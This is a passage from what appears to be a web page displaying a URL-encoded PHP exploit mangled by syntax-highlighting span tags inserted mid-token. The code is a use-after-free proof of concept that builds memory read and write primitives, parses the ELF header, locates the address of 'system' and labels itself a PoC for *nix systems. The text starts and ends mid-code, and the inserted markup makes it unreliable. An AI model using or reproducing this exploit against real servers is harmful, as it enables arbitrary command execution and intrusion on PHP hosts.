class=\"title\">a</span>++++++++++++%24<span class=\"title\">address</span>+%3<span class=\"title\">c</span>%3<span class=\"title\">c</span>%3<span class=\"title\">d</span>+8%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%24<span class=\"title\">address</span>+%7<span class=\"title\">c</span>%3<span class=\"title\">d</span>+<span class=\"title\">ord</span>(%24<span class=\"title\">str</span>%5<span class=\"title\">b</span>%24<span class=\"title\">p</span>%2<span class=\"title\">b</span>%24<span class=\"title\">j</span>%5<span class=\"title\">d</span>)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">return</span>+%24<span class=\"title\">address</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++<span class=\"title\">function</span>+<span class=\"title\">ptr2str</span>(%24<span class=\"title\">ptr</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">m</span>+%3<span class=\"title\">d</span>+8)+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++%24<span class=\"title\">out</span>+%3<span class=\"title\">d</span>+%22%22%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">for</span>+(%24<span class=\"title\">i</span>%3<span class=\"title\">d0</span>%3<span class=\"title\">b</span>+%24<span class=\"title\">i</span>+%3<span class=\"title\">c</span>+%24<span class=\"title\">m</span>%3<span class=\"title\">b</span>+%24<span class=\"title\">i</span>%2<span class=\"title\">b</span>%2<span class=\"title\">b</span>)+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%24<span class=\"title\">out</span>+.%3<span class=\"title\">d</span>+<span class=\"title\">sprintf</span>(%27%25<span class=\"title\">c</span>%27%2<span class=\"title\">c</span>%24<span class=\"title\">ptr</span>+%26+0<span class=\"title\">xff</span>)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%24<span class=\"title\">ptr</span>+%3<span class=\"title\">e</span>%3<span class=\"title\">e</span>%3<span class=\"title\">d</span>+8%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">return</span>+%24<span class=\"title\">out</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++<span class=\"title\">function</span>+<span class=\"title\">write</span>(%26%24<span class=\"title\">str</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">p</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">v</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">n</span>+%3<span class=\"title\">d</span>+8)+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++%24<span class=\"title\">i</span>+%3<span class=\"title\">d</span>+0%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">for</span>(%24<span class=\"title\">i</span>+%3<span class=\"title\">d</span>+0%3<span class=\"title\">b</span>+%24<span class=\"title\">i</span>+%3<span class=\"title\">c</span>+%24<span class=\"title\">n</span>%3<span class=\"title\">b</span>+%24<span class=\"title\">i</span>%2<span class=\"title\">b</span>%2<span class=\"title\">b</span>)+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%24<span class=\"title\">str</span>%5<span class=\"title\">b</span>%24<span class=\"title\">p</span>+%2<span class=\"title\">b</span>+%24<span class=\"title\">i</span>%5<span class=\"title\">d</span>+%3<span class=\"title\">d</span>+<span class=\"title\">sprintf</span>(%27%25<span class=\"title\">c</span>%27%2<span class=\"title\">c</span>%24<span class=\"title\">v</span>+%26+0<span class=\"title\">xff</span>)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%24<span class=\"title\">v</span>+%3<span class=\"title\">e</span>%3<span class=\"title\">e</span>%3<span class=\"title\">d</span>+8%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++<span class=\"title\">function</span>+<span class=\"title\">leak</span>(%24<span class=\"title\">addr</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">p</span>+%3<span class=\"title\">d</span>+0%2<span class=\"title\">c</span>+%24<span class=\"title\">s</span>+%3<span class=\"title\">d</span>+8)+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">global</span>+%24<span class=\"title\">abc</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">helper</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">write</span>(%24<span class=\"title\">abc</span>%2<span class=\"title\">c</span>+0<span class=\"title\">x68</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">addr</span>+%2<span class=\"title\">b</span>+%24<span class=\"title\">p</span>+-+0<span class=\"title\">x10</span>)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++%24<span class=\"title\">leak</span>+%3<span class=\"title\">d</span>+<span class=\"title\">strlen</span>(%24<span class=\"title\">helper</span>-%3<span class=\"title\">ea</span>)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">if</span>(%24<span class=\"title\">s</span>+!%3<span class=\"title\">d</span>+8)+%7<span class=\"title\">b</span>+%24<span class=\"title\">leak</span>+%25%3<span class=\"title\">d</span>+2+%3<span class=\"title\">c</span>%3<span class=\"title\">c</span>+(%24<span class=\"title\">s</span>+*+8)+-+1%3<span class=\"title\">b</span>+%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">return</span>+%24<span class=\"title\">leak</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++<span class=\"title\">function</span>+<span class=\"title\">parse_elf</span>(%24<span class=\"title\">base</span>)+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++%24<span class=\"title\">e_type</span>+%3<span class=\"title\">d</span>+<span class=\"title\">leak</span>(%24<span class=\"title\">base</span>%2<span class=\"title\">c</span>+0<span class=\"title\">x10</span>%2<span class=\"title\">c</span>+2)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++++++%24<span class=\"title\">e_phoff</span>+%3<span class=\"title\">d</span>+<span class=\"title\">leak</span>(%24<span class=\"title\">base</span>%2<span class=\"title\">c</span>+0<span class=\"title\">x20</span>)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++%24<span class=\"title\">e_phentsize</span>+%3<span class=\"title\">d</span>+<span class=\"title\">leak</span>(%24<span class=\"title\">base</span>%2<span class=\"title\">c</span>+0<span class=\"title\">x36</span>%2<span class=\"title\">c</span>+2)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++%24<span class=\"title\">e_phnum</span>+%3<span class=\"title\">d</span>+<span class=\"title\">leak</span>(%24<span class=\"title\">base</span>%2<span class=\"title\">c</span>+0<span class=\"title\">x38</span>%2<span class=\"title\">c</span>+2)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">for</span>(%24<span class=\"title\">i</span>+%3<span class=\"title\">d</span>+0%3<span class=\"title\">b</span>+%24<span class=\"title\">i</span>+%3<span class=\"title\">c</span>+%24<span class=\"title\">e_phnum</span>%3<span class=\"title\">b</span>+%24<span class=\"title\">i</span>%2<span class=\"title\">b</span>%2<span class=\"title\">b</span>)+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%24<span class=\"title\">header</span>+%3<span class=\"title\">d</span>+%24<span class=\"title\">base</span>+%2<span class=\"title\">b</span>+%24<span class=\"title\">e_phoff</span>+%2<span class=\"title\">b</span>+%24<span class=\"title\">i</span>+*+%24<span class=\"title\">e_phentsize</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%24<span class=\"title\">p_type</span>++%3<span class=\"title\">d</span>+<span class=\"title\">leak</span>(%24<span class=\"title\">header</span>%2<span class=\"title\">c</span>+0%2<span class=\"title\">c</span>+4)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%24<span class=\"title\">p_flags</span>+%3<span class=\"title\">d</span>+<span class=\"title\">leak</span>(%24<span class=\"title\">header</span>%2<span class=\"title\">c</span>+4%2<span class=\"title\">c</span>+4)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%24<span class=\"title\">p_vaddr</span>+%3<span class=\"title\">d</span>+<span class=\"title\">leak</span>(%24<span class=\"title\">header</span>%2<span class=\"title\">c</span>+0<span class=\"title\">x10</span>)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%24<span class=\"title\">p_memsz</span>+%3<span class=\"title\">d</span>+<span class=\"title\">leak</span>(%24<span class=\"title\">header</span>%2<span class=\"title\">c</span>+0<span class=\"title\">x28</span>)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++++++++++<span class=\"title\">if</span>(%24<span class=\"title\">p_type</span>+%3<span class=\"title\">d</span>%3<span class=\"title\">d</span>+1+%26%26+%24<span class=\"title\">p_flags</span>+%3<span class=\"title\">d</span>%3<span class=\"title\">d</span>+6)+%7<span class=\"title\">b</span>+%23+<span class=\"title\">PT_LOAD</span>%2<span class=\"title\">c</span>+<span class=\"title\">PF_Read_Write</span>%0<span class=\"title\">a</span>++++++++++++++++%23+<span class=\"title\">handle</span>+<span class=\"title\">pie</span>%0<span class=\"title\">a</span>++++++++++++++++%24<span class=\"title\">data_addr</span>+%3<span class=\"title\">d</span>+%24<span class=\"title\">e_type</span>+%3<span class=\"title\">d</span>%3<span class=\"title\">d</span>+2+%3<span class=\"title\">f</span>+%24<span class=\"title\">p_vaddr</span>+%3<span class=\"title\">a</span>+%24<span class=\"title\">base</span>+%2<span class=\"title\">b</span>+%24<span class=\"title\">p_vaddr</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++++++%24<span class=\"title\">data_size</span>+%3<span class=\"title\">d</span>+%24<span class=\"title\">p_memsz</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%7<span class=\"title\">d</span>+<span class=\"title\">else</span>+<span class=\"title\">if</span>(%24<span class=\"title\">p_type</span>+%3<span class=\"title\">d</span>%3<span class=\"title\">d</span>+1+%26%26+%24<span class=\"title\">p_flags</span>+%3<span class=\"title\">d</span>%3<span class=\"title\">d</span>+5)+%7<span class=\"title\">b</span>+%23+<span class=\"title\">PT_LOAD</span>%2<span class=\"title\">c</span>+<span class=\"title\">PF_Read_exec</span>%0<span class=\"title\">a</span>++++++++++++++++%24<span class=\"title\">text_size</span>+%3<span class=\"title\">d</span>+%24<span class=\"title\">p_memsz</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>++++++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">if</span>(!%24<span class=\"title\">data_addr</span>+%7<span class=\"title\">c</span>%7<span class=\"title\">c</span>+!%24<span class=\"title\">text_size</span>+%7<span class=\"title\">c</span>%7<span class=\"title\">c</span>+!%24<span class=\"title\">data_size</span>)%0<span class=\"title\">a</span>++++++++++++<span class=\"title\">return</span>+<span class=\"title\">false</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">return</span>+%5<span class=\"title\">b</span>%24<span class=\"title\">data_addr</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">text_size</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">data_size</span>%5<span class=\"title\">d</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++<span class=\"title\">function</span>+<span class=\"title\">get_basic_funcs</span>(%24<span class=\"title\">base</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">elf</span>)+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">list</span>(%24<span class=\"title\">data_addr</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">text_size</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">data_size</span>)+%3<span class=\"title\">d</span>+%24<span class=\"title\">elf</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">for</span>(%24<span class=\"title\">i</span>+%3<span class=\"title\">d</span>+0%3<span class=\"title\">b</span>+%24<span class=\"title\">i</span>+%3<span class=\"title\">c</span>+%24<span class=\"title\">data_size</span>+%2<span class=\"title\">f</span>+8%3<span class=\"title\">b</span>+%24<span class=\"title\">i</span>%2<span class=\"title\">b</span>%2<span class=\"title\">b</span>)+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%24<span class=\"title\">leak</span>+%3<span class=\"title\">d</span>+<span class=\"title\">leak</span>(%24<span class=\"title\">data_addr</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">i</span>+*+8)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++<span class=\"title\">if</span>(%24<span class=\"title\">leak</span>+-+%24<span class=\"title\">base</span>+%3<span class=\"title\">e</span>+0+%26%26+%24<span class=\"title\">leak</span>+-+%24<span class=\"title\">base</span>+%3<span class=\"title\">c</span>+%24<span class=\"title\">data_addr</span>+-+%24<span class=\"title\">base</span>)+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++++++%24<span class=\"title\">deref</span>+%3<span class=\"title\">d</span>+<span class=\"title\">leak</span>(%24<span class=\"title\">leak</span>)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++++++%23+%27<span class=\"title\">constant</span>%27+<span class=\"title\">constant</span>+<span class=\"title\">check</span>%0<span class=\"title\">a</span>++++++++++++++++<span class=\"title\">if</span>(%24<span class=\"title\">deref</span>+!%3<span class=\"title\">d</span>+0<span class=\"title\">x746e6174736e6f63</span>)%0<span class=\"title\">a</span>++++++++++++++++++++<span class=\"title\">continue</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%7<span class=\"title\">d</span>+<span class=\"title\">else</span>+<span class=\"title\">continue</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++++++++++%24<span class=\"title\">leak</span>+%3<span class=\"title\">d</span>+<span class=\"title\">leak</span>(%24<span class=\"title\">data_addr</span>%2<span class=\"title\">c</span>+(%24<span class=\"title\">i</span>+%2<span class=\"title\">b</span>+4)+*+8)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++<span class=\"title\">if</span>(%24<span class=\"title\">leak</span>+-+%24<span class=\"title\">base</span>+%3<span class=\"title\">e</span>+0+%26%26+%24<span class=\"title\">leak</span>+-+%24<span class=\"title\">base</span>+%3<span class=\"title\">c</span>+%24<span class=\"title\">data_addr</span>+-+%24<span class=\"title\">base</span>)+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++++++%24<span class=\"title\">deref</span>+%3<span class=\"title\">d</span>+<span class=\"title\">leak</span>(%24<span class=\"title\">leak</span>)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++++++%23+%27<span class=\"title\">bin2hex</span>%27+<span class=\"title\">constant</span>+<span class=\"title\">check</span>%0<span class=\"title\">a</span>++++++++++++++++<span class=\"title\">if</span>(%24<span class=\"title\">deref</span>+!%3<span class=\"title\">d</span>+0<span class=\"title\">x786568326e6962</span>)%0<span class=\"title\">a</span>++++++++++++++++++++<span class=\"title\">continue</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%7<span class=\"title\">d</span>+<span class=\"title\">else</span>+<span class=\"title\">continue</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++++++++++<span class=\"title\">return</span>+%24<span class=\"title\">data_addr</span>+%2<span class=\"title\">b</span>+%24<span class=\"title\">i</span>+*+8%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++<span class=\"title\">function</span>+<span class=\"title\">get_binary_base</span>(%24<span class=\"title\">binary_leak</span>)+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++%24<span class=\"title\">base</span>+%3<span class=\"title\">d</span>+0%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++%24<span class=\"title\">start</span>+%3<span class=\"title\">d</span>+%24<span class=\"title\">binary_leak</span>+%26+0<span class=\"title\">xfffffffffffff000</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">for</span>(%24<span class=\"title\">i</span>+%3<span class=\"title\">d</span>+0%3<span class=\"title\">b</span>+%24<span class=\"title\">i</span>+%3<span class=\"title\">c</span>+0<span class=\"title\">x1000</span>%3<span class=\"title\">b</span>+%24<span class=\"title\">i</span>%2<span class=\"title\">b</span>%2<span class=\"title\">b</span>)+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%24<span class=\"title\">addr</span>+%3<span class=\"title\">d</span>+%24<span class=\"title\">start</span>+-+0<span class=\"title\">x1000</span>+*+%24<span class=\"title\">i</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%24<span class=\"title\">leak</span>+%3<span class=\"title\">d</span>+<span class=\"title\">leak</span>(%24<span class=\"title\">addr</span>%2<span class=\"title\">c</span>+0%2<span class=\"title\">c</span>+7)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++<span class=\"title\">if</span>(%24<span class=\"title\">leak</span>+%3<span class=\"title\">d</span>%3<span class=\"title\">d</span>+0<span class=\"title\">x10102464c457f</span>)+%7<span class=\"title\">b</span>+%23+<span class=\"title\">ELF</span>+<span class=\"title\">header</span>%0<span class=\"title\">a</span>++++++++++++++++<span class=\"title\">return</span>+%24<span class=\"title\">addr</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>++++++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++<span class=\"title\">function</span>+<span class=\"title\">get_system</span>(%24<span class=\"title\">basic_funcs</span>)+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++%24<span class=\"title\">addr</span>+%3<span class=\"title\">d</span>+%24<span class=\"title\">basic_funcs</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">do</span>+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%24<span class=\"title\">f_entry</span>+%3<span class=\"title\">d</span>+<span class=\"title\">leak</span>(%24<span class=\"title\">addr</span>)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%24<span class=\"title\">f_name</span>+%3<span class=\"title\">d</span>+<span class=\"title\">leak</span>(%24<span class=\"title\">f_entry</span>%2<span class=\"title\">c</span>+0%2<span class=\"title\">c</span>+6)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++++++++++<span class=\"title\">if</span>(%24<span class=\"title\">f_name</span>+%3<span class=\"title\">d</span>%3<span class=\"title\">d</span>+0<span class=\"title\">x6d6574737973</span>)+%7<span class=\"title\">b</span>+%23+<span class=\"title\">system</span>%0<span class=\"title\">a</span>++++++++++++++++<span class=\"title\">return</span>+<span class=\"title\">leak</span>(%24<span class=\"title\">addr</span>+%2<span class=\"title\">b</span>+8)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>++++++++++++%24<span class=\"title\">addr</span>+%2<span class=\"title\">b</span>%3<span class=\"title\">d</span>+0<span class=\"title\">x20</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++%7<span class=\"title\">d</span>+<span class=\"title\">while</span>(%24<span class=\"title\">f_entry</span>+!%3<span class=\"title\">d</span>+0)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">return</span>+<span class=\"title\">false</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++<span class=\"title\">function</span>+<span class=\"title\">trigger_uaf</span>(%24<span class=\"title\">arg</span>)+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++%23+<span class=\"title\">str_shuffle</span>+<span class=\"title\">prevents</span>+<span class=\"title\">opcache</span>+<span class=\"title\">string</span>+<span class=\"title\">interning</span>%0<span class=\"title\">a</span>++++++++%24<span class=\"title\">arg</span>+%3<span class=\"title\">d</span>+<span class=\"title\">str_shuffle</span>(%27<span class=\"title\">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>%27)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++%24<span class=\"title\">vuln</span>+%3<span class=\"title\">d</span>+<span class=\"title\">new</span>+<span class=\"title\">Vuln</span>()%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++%24<span class=\"title\">vuln</span>-%3<span class=\"title\">ea</span>+%3<span class=\"title\">d</span>+%24<span class=\"title\">arg</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++<span class=\"title\">if</span>(<span class=\"title\">stristr</span>(<span class=\"title\">PHP_OS</span>%2<span class=\"title\">c</span>+%27<span class=\"title\">WIN</span>%27))+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">die</span>(%27<span class=\"title\">This</span>+<span class=\"title\">PoC</span>+<span class=\"title\">is</span>+<span class=\"title\">for</span>+*<span class=\"title\">nix</span>+<span class=\"title\">systems</span>+<span class=\"title\">only</span>.%27)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++%24<span class=\"title\">n_alloc</span>+%3<span class=\"title\">d</span>+10%3<span class=\"title\">b</span>+%23+<span class=\"title\">increase</span>+<span class=\"title\">this</span>+<span class=\"title\">value</span>+<span class=\"title\">if</span>+<span class=\"title\">UAF</span>+<span class=\"title\">fails</span>%0<span class=\"title\">a</span>++++%24<span class=\"title\">contiguous</span>+%3<span class=\"title\">d</span>+%5<span class=\"title\">b</span>%5<span class=\"title\">d</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++<span class=\"title\">for</span>(%24<span class=\"title\">i</span>+%3<span class=\"title\">d</span>+0%3<span class=\"title\">b</span>+%24<span class=\"title\">i</span>+%3<span class=\"title\">c</span>+%24<span class=\"title\">n_alloc</span>%3<span class=\"title\">b</span>+%24<span class=\"title\">i</span>%2<span class=\"title\">b</span>%2<span class=\"title\">b</span>)%0<span class=\"title\">a</span>++++++++%24<span class=\"title\">contiguous</span>%5<span class=\"title\">b</span>%5<span class=\"title\">d</span>+%3<span class=\"title\">d</span>+<span class=\"title\">str_shuffle</span>(%27<span class=\"title\">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>%27)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++<span class=\"title\">trigger_uaf</span>(%27<span class=\"title\">x</span>%27)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++%24<span class=\"title\">abc</span>+%3<span class=\"title\">d</span>+%24<span class=\"title\">backtrace</span>%5<span class=\"title\">b1</span>%5<span class=\"title\">d</span>%5<span class=\"title\">b</span>%27<span class=\"title\">args</span>%27%5<span class=\"title\">d</span>%5<span class=\"title\">b0</span>%5<span class=\"title\">d</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++%24<span class=\"title\">helper</span>+%3<span class=\"title\">d</span>+<span class=\"title\">new</span>+<span class=\"title\">Helper</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++%24<span class=\"title\">helper</span>-%3<span class=\"title\">eb</span>+%3<span class=\"title\">d</span>+<span class=\"title\">function</span>+(%24<span class=\"title\">x</span>)+%7<span class=\"title\">b</span>+%7<span class=\"title\">d</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++<span class=\"title\">if</span>(<span class=\"title\">strlen</span>(%24<span class=\"title\">abc</span>)+%3<span class=\"title\">d</span>%3<span class=\"title\">d</span>+79+%7<span class=\"title\">c</span>%7<span class=\"title\">c</span>+<span class=\"title\">strlen</span>(%24<span class=\"title\">abc</span>)+%3<span class=\"title\">d</span>%3<span class=\"title\">d</span>+0)+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">die</span>(%22<span class=\"title\">UAF</span>+<span class=\"title\">failed</span>%22)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++%23+<span class=\"title\">leaks</span>%0<span class=\"title\">a</span>++++%24<span class=\"title\">closure_handlers</span>+%3<span class=\"title\">d</span>+<span class=\"title\">str2ptr</span>(%24<span class=\"title\">abc</span>%2<span class=\"title\">c</span>+0)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++%24<span class=\"title\">php_heap</span>+%3<span class=\"title\">d</span>+<span class=\"title\">str2ptr</span>(%24<span class=\"title\">abc</span>%2<span class=\"title\">c</span>+0<span class=\"title\">x58</span>)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++%24<span class=\"title\">abc_addr</span>+%3<span class=\"title\">d</span>+%24<span class=\"title\">php_heap</span>+-+0<span class=\"title\">xc8</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++%23+<span class=\"title\">fake</span>+<span class=\"title\">value</span>%0<span class=\"title\">a</span>++++<span class=\"title\">write</span>(%24<span class=\"title\">abc</span>%2<span class=\"title\">c</span>+0<span class=\"title\">x60</span>%2<span class=\"title\">c</span>+2)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++<span class=\"title\">write</span>(%24<span class=\"title\">abc</span>%2<span class=\"title\">c</span>+0<span class=\"title\">x70</span>%2<span class=\"title\">c</span>+6)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++%23+<span class=\"title\">fake</span>+<span class=\"title\">reference</span>%0<span class=\"title\">a</span>++++<span class=\"title\">write</span>(%24<span class=\"title\">abc</span>%2<span class=\"title\">c</span>+0<span class=\"title\">x10</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">abc_addr</span>+%2<span class=\"title\">b</span>+0<span class=\"title\">x60</span>)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++<span class=\"title\">write</span>(%24<span class=\"title\">abc</span>%2<span class=\"title\">c</span>+0<span class=\"title\">x18</span>%2<span class=\"title\">c</span>+0<span class=\"title\">xa</span>)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++%24<span class=\"title\">closure_obj</span>+%3<span class=\"title\">d</span>+<span class=\"title\">str2ptr</span>(%24<span class=\"title\">abc</span>%2<span class=\"title\">c</span>+0<span class=\"title\">x20</span>)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++%24<span class=\"title\">binary_leak</span>+%3<span class=\"title\">d</span>+<span class=\"title\">leak</span>(%24<span class=\"title\">closure_handlers</span>%2<span class=\"title\">c</span>+8)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++<span class=\"title\">if</span>(!(%24<span class=\"title\">base</span>+%3<span class=\"title\">d</span>+<span class=\"title\">get_binary_base</span>(%24<span class=\"title\">binary_leak</span>)))+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">die</span>(%22<span class=\"title\">Couldn</span>%27<span class=\"title\">t</span>+<span class=\"title\">determine</span>+<span class=\"title\">binary</span>+<span class=\"title\">base</span>+<span class=\"title\">address</span>%22)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++<span class=\"title\">if</span>(!(%24<span class=\"title\">elf</span>+%3<span class=\"title\">d</span>+<span class=\"title\">parse_elf</span>(%24<span class=\"title\">base</span>)))+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">die</span>(%22<span class=\"title\">Couldn</span>%27<span class=\"title\">t</span>+<span class=\"title\">parse</span>+<span class=\"title\">ELF</span>+<span class=\"title\">header</span>%22)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++<span class=\"title\">if</span>(!(%24<span class=\"title\">basic_funcs</span>+%3<span class=\"title\">d</span>+<span class=\"title\">get_basic_funcs</span>(%24<span class=\"title\">base</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">elf</span>)))+%7<span 